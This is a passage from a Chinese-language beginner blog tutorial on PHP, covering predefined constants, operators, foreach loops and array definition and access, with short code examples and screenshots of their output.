:PHP程序文件行数。它可以告诉我们，当前代码在第几行。</p><p>（3）PHP_VERSION:当前解析器的版本号。它可以告诉我们当前PHP解析器的版本号，我们可以提前知道我们的PHP代码是否可被该PHP解析器解析。</p><p>（4）PHP_OS：执行当前PHP版本的操作系统名称。它可以告诉我们服务器所用的操作系统名称，我们可以根据该操作系统优化我们的代码。</p><pre class="language-php" data-language="php"><code class="language-php">1 |<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token number">2</span> <span class="token operator">|</span><span class="token keyword">echo</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token number">3</span> <span class="token operator">|</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token number">4</span> <span class="token operator">|</span><span class="token keyword">echo</span> <span class="token constant">__LINE__</span><span class="token punctuation">;</span><span class="token number">5</span> <span class="token operator">|</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token number">6</span> <span class="token operator">|</span><span class="token keyword">echo</span> <span class="token constant">PHP_VERSION</span><span class="token punctuation">;</span><span class="token number">7</span> <span class="token operator">|</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token number">8</span> <span class="token operator">|</span><span class="token keyword">echo</span> <span class="token constant">PHP_OS</span><span class="token punctuation">;</span><span class="token number">9</span> <span class="token operator">|</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token number">10</span><span class="token operator">|</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200317204248515.png" alt="Augenstern" loading="lazy"></p><h2 id="常量取值"><a href="#常量取值" class="headerlink" title="常量取值"></a>常量取值</h2><p>获取常量值的有两种方法取值。第一种是使用常量名直接获取值</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"PI"</span><span class="token punctuation">,</span><span class="token number">3.14</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$area</span> <span class="token operator">=</span> <span class="token constant">PI</span><span class="token operator">*</span><span class="token variable">$r</span><span class="token operator">*</span><span class="token variable">$r</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><p>计算圆的面积。<br>第二种是使用constant()函数。它和直接使用常量名输出的效果是一样的，但函数可以动态的输出不同的常量，</p><pre class="language-php" data-language="php"><code class="language-php">mixed <span class="token function">constant</span><span class="token punctuation">(</span>string constant_name<span class="token punctuation">)</span></code></pre><p>（注：mixed表示函数返回值类型为多种不同的类型，string表示参数类型为字符串类型）<br>同样是计算圆的面积：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"PI"</span><span class="token punctuation">,</span><span class="token number">3.14</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$area</span> <span class="token operator">=</span> <span class="token function">constant</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"PI"</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$r</span><span class="token operator">*</span><span class="token variable">$r</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h2 id="如何判断一个常量是否被定义"><a href="#如何判断一个常量是否被定义" class="headerlink" title="如何判断一个常量是否被定义"></a>如何判断一个常量是否被定义</h2><p>如果常量被重复定义以后，PHP解析器会发出“<code>Constant XXX already defined</code>”的警告，提醒我们该常量已经被定义过。<br>defined()函数可以帮助我们判断一个常量是否已经定义，其语法格式为：<code>bool defined(string constants_name)</code><br>它只有参数<code>constant_name</code>，指的是要获取常量的名称，若存在则返回布尔类型<strong>true</strong>，否则返回布尔类型<strong>false</strong>; （注：bool表示函数返回值类型为<strong>布尔类型</strong>）</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">define</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"PI1"</span><span class="token punctuation">,</span><span class="token number">3.14</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"PI1"</span><span class="token punctuation">;</span><span class="token variable">$is1</span> <span class="token operator">=</span> <span class="token function">defined</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$is2</span> <span class="token operator">=</span> <span class="token function">defined</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"PI2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$is1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$is2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>运行结果如下：<br><img src="https://img-blog.csdnimg.cn/20200317211359730.png" alt="Augenstern" loading="lazy"></p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p>PHP运算符一般分为算术运算符、赋值运算符、比较运算符、三元运算符、逻辑运算符、字符串连接运算符、错误控制运算符。<br>算术运算符：<br><img src="https://img-blog.csdnimg.cn/20200317211952236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p>PHP的赋值运算符有两种，分别是：</p><p>(1)“=”：把右边表达式的值赋给左边的运算数。它将右边表达式值复制一份，交给左边的运算数。换而言之，首先给左边的运算数申请了一块内存，然后把复制的值放到这个内存中。</p><p>(2)“&amp;”：引用赋值，意味着两个变量都指向同一个数据。它将使两个变量共享一块内存，如果这个内存存储的数据变了，那么两个变量的值都会发生变化。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"我的博客"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"https://zxcv0221.github.io"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200317212552557.png" alt="Augenstern" loading="lazy"></p><h2 id="比较运算符："><a href="#比较运算符：" class="headerlink" title="比较运算符："></a>比较运算符：</h2><p><img src="https://img-blog.csdnimg.cn/20200317212701414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>示例如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>      <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">&lt;</span><span class="token operator">></span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!==</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">&lt;</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">&lt;</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">></span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">&lt;=</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">>=</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">>=</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>运行结果如下：<br><img src="https://img-blog.csdnimg.cn/20200317213238624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="三元运算符："><a href="#三元运算符：" class="headerlink" title="三元运算符："></a>三元运算符：</h2><p>(“?:”)三元运算符也是一个比较运算符，对于表达式(expr1)?(expr2):(expr3)，如果expr1的值为true，则此表达式的值为expr2，否则为expr3。看代码就更清楚了：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">78</span><span class="token punctuation">;</span><span class="token comment">//成绩</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">>=</span> <span class="token number">60</span><span class="token operator">?</span><span class="token double-quoted-string string">"及格"</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"不及格"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>运行结果当然是<code>及格</code>。<br>逻辑运算符：<br>逻辑运算符主用是进行逻辑运算的，例如：逻辑与、逻辑或、逻辑异或、逻辑非等，在PHP中常用的逻辑运算符如下表：<br><img src="https://img-blog.csdnimg.cn/20200317213806578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我们可以从投票的角度来理解逻辑运算：</p><p>1、逻辑与：要求所有人都投票同意，才会通过某协议；</p><p>2、逻辑或：只要求一个人投票同意就行；</p><p>3、逻辑异或：只能有且只能有一个人投票同意；</p><p>4、逻辑非：某个人要反对，但是通过逻辑非，使其反对无效；</p><p>“与”和“或”有两种不同形式运算符的原因是它们运算的优先级（就是运算的有限顺序，比如我们小学的时候学习四则运算，加减乘除混合在一起啦，优先计算乘除，再计算加减）不同。</p><p>示例：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token boolean constant">TRUE</span><span class="token punctuation">;</span> <span class="token comment">//A同意</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token boolean constant">TRUE</span><span class="token punctuation">;</span> <span class="token comment">//B同意</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token boolean constant">FALSE</span><span class="token punctuation">;</span> <span class="token comment">//C反对</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token boolean constant">FALSE</span><span class="token punctuation">;</span> <span class="token comment">//D反对</span><span class="token comment">//顺便复习下三元运算符</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">and</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token double-quoted-string string">"通过"</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"不通过"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">or</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token double-quoted-string string">"通过"</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"不通过"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">xor</span> <span class="token variable">$c</span> <span class="token keyword">xor</span> <span class="token variable">$d</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token double-quoted-string string">"通过"</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"不通过"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">!</span><span class="token variable">$c</span><span class="token operator">?</span><span class="token double-quoted-string string">"通过"</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"不通过"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$d</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token double-quoted-string string">"通过"</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"不通过"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span> <span class="token operator">||</span> <span class="token variable">$c</span> <span class="token operator">||</span> <span class="token variable">$d</span><span class="token operator">?</span><span class="token double-quoted-string string">"通过"</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"不通过"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2020031721574420.png" alt="Augenstern" loading="lazy"></p><h2 id="连接运算符"><a href="#连接运算符" class="headerlink" title="连接运算符"></a>连接运算符</h2><p>字符串连接运算符是为了将两个字符串进行连接，PHP中提供的字符串连接运算符有：<br>（1）连接运算符(“.”)：它返回将右参数附加到左参数后面所得的字符串。<br>（2）连接赋值运算符(“.=”)：它将右边参数附加到左边的参数后。</p><p>示例：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"这位大佬"</span><span class="token punctuation">;</span><span class="token variable">$tip</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"，欢迎您指点我的博客！"</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"我自横刀向天笑"</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token punctuation">.</span><span class="token operator">=</span><span class="token double-quoted-string string">"去留肝胆两昆仑"</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"将进酒"</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"杯莫停！"</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$tip</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$c</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200317220631112.png" alt="Augenstern" loading="lazy"></p><h2 id="取模运算符"><a href="#取模运算符" class="headerlink" title="取模运算符"></a>取模运算符</h2><p>直接看代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>      <span class="token variable">$maxLine</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token comment">//每排人数</span> <span class="token variable">$no</span> <span class="token operator">=</span> <span class="token number">17</span><span class="token punctuation">;</span><span class="token comment">//学生编号</span>     <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">ceil</span><span class="token punctuation">(</span><span class="token variable">$no</span> <span class="token operator">/</span> <span class="token variable">$maxLine</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$no</span> <span class="token operator">%</span> <span class="token variable">$maxLine</span> <span class="token operator">?</span> <span class="token variable">$no</span> <span class="token operator">%</span> <span class="token variable">$maxLine</span> <span class="token punctuation">:</span> <span class="token variable">$maxLine</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"编号&lt;b>"</span><span class="token punctuation">.</span><span class="token variable">$no</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/b>的座位在第&lt;b>"</span><span class="token punctuation">.</span><span class="token variable">$line</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/b>排第&lt;b>"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/b>个位置"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200317221705779.png" alt="Augenstern" loading="lazy"></p><h1 id="foreach语句"><a href="#foreach语句" class="headerlink" title="foreach语句"></a>foreach语句</h1><p>在PHP中foreach循环语句，常用于遍历数组（下面介绍，这里主要看这个语句的用法），一般有两种使用方式:不取下标、取下标。<br>（1）只取值，不取下标</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">foreach</span> <span class="token punctuation">(</span>数组 <span class="token keyword">as</span> 值<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//执行的任务</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>（2）同时取下标和值</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span>数组 <span class="token keyword">as</span> 下标 <span class="token operator">=</span><span class="token operator">></span> 值<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//执行的任务</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>写个示例：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$books</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'2010'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'鬼谷子'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'2011'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'人性的弱点'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'2012'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'狼道'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'2013'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'莫非定律'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'2014'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'山海经'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'2015'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'红楼梦'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'2016'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'西游记'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'2017'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'水浒传'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'2018'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'三国演义'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'2019'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'金瓶梅嘿嘿'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//10本书的编号和书名，用数组存储</span><span class="token comment">//使用循环结构遍历数组,获取编号和书名  </span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$books</span> <span class="token keyword">as</span>  <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token comment">//foreach($students as $key => $v)只需在这里把代码改成这样即可</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token variable">$v</span><span class="token punctuation">;</span><span class="token comment">//输出（打印）书名</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>至于数组 ，后面介绍。先看最后几行代码。<img src="https://img-blog.csdnimg.cn/20200320235117175.png" alt="Augenstern" loading="lazy"><br>取下标的自行实现。</p><hr><p>说明：我以前使用浏览器编译代码，现在换编译软件了，所以我从现在往后面所学的都会是源码运行，PHP里面浏览器编译和源码还是不一样的，举个栗子：浏览器里面编译，换行符是<code>&lt;br /&gt;</code>，而源码里面的换行却是<code>\n</code>与C语言有点相似。</p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组就简单介绍一下：<br>定义一个数组：array()<br>可以用array()来新建一个数组，它接受任意数量的用逗号分隔的(key)=&gt;(value)</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span> key <span class="token operator">=</span><span class="token operator">></span> value……<span class="token punctuation">)</span><span class="token comment">//key可以是一个整数int，或字符串string</span><span class="token comment">//value可以是任意类型的值。</span></code></pre><p>最后一个数组单元的逗号可以省去<br>看个定义一个数组的例子：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token double-quoted-string string">"lxj"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"lalala"</span><span class="token punctuation">,</span>    <span class="token double-quoted-string string">"wkx"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"xixixi"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//两种方法</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token double-quoted-string string">"lxj"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"lalala"</span><span class="token punctuation">,</span>    <span class="token double-quoted-string string">"wkx"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"xixix"</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>第二种方法我专门去查了一下，这个PHP官方手册解释的是自PHP 5.4 起可以用这种方法的，短数组定义方法。</p><h2 id="关于key"><a href="#关于key" class="headerlink" title="关于key"></a>关于key</h2><p>1.包含有合法的整数型字符串会被转换为整型，如“8”，会被存储为8。但是“08”不会被强制转换。因为他不是一个合法的十进制数。<br>2.浮点数也会被转换成整型。小数点后面的会被舍去。注意是舍去，不是四舍五入，而是全部扔了不要（哈哈，真浪费）。<br>3.布尔类型的也会被转换成整型，true被存储为1，而false被存储为0.<br>4.NULL会被转换为空字符串，null实际上会被存储为“  ”。<br>接着说数组：<br>如果在定义一个数组时多个单元都使用了同一个key，那么就会只使用最后一个，之前的都会被覆盖，看个代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>php<span class="token comment">//这个代码同时反映类型强制和覆盖</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"mary"</span><span class="token punctuation">,</span>    <span class="token double-quoted-string string">"1"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"jack"</span><span class="token punctuation">,</span>    <span class="token number">1.5</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"rose"</span><span class="token punctuation">,</span>    <span class="token boolean constant">true</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"lxj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>结果呢，只会有lxj<br><img src="https://img-blog.csdnimg.cn/20200328130625744.png" alt="Augenstern" loading="lazy"><br>PHP数组还可以有混合key的，就是数组里的变量既有整型，也有字符串。代码就不写了。也没什么可举例子的。</p><h2 id="数组的访问"><a href="#数组的访问" class="headerlink" title="数组的访问"></a>数组的访问</h2><p>通过语法：数组名[key]<br>没有什么是代码解释不清的。代码上：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token double-quoted-string string">"lxj"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"Augenstern"</span><span class="token punctuation">,</span>    <span class="token number">0258</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8520</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"lxj"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0258</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>这个输出的就是<br><img src="https://img-blog.csdnimg.cn/20200328131731978.png" alt="Augenstern" loading="lazy"><br>tip：方括号和花括号能在这里互换使用，达到同样的效果。赶紧试一下去。</p><h2 id="增加、修改、删除数组里的值"><a href="#增加、修改、删除数组里的值" class="headerlink" title="增加、修改、删除数组里的值"></a>增加、修改、删除数组里的值</h2><p>这里用一个代码就能看出怎么玩了：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span 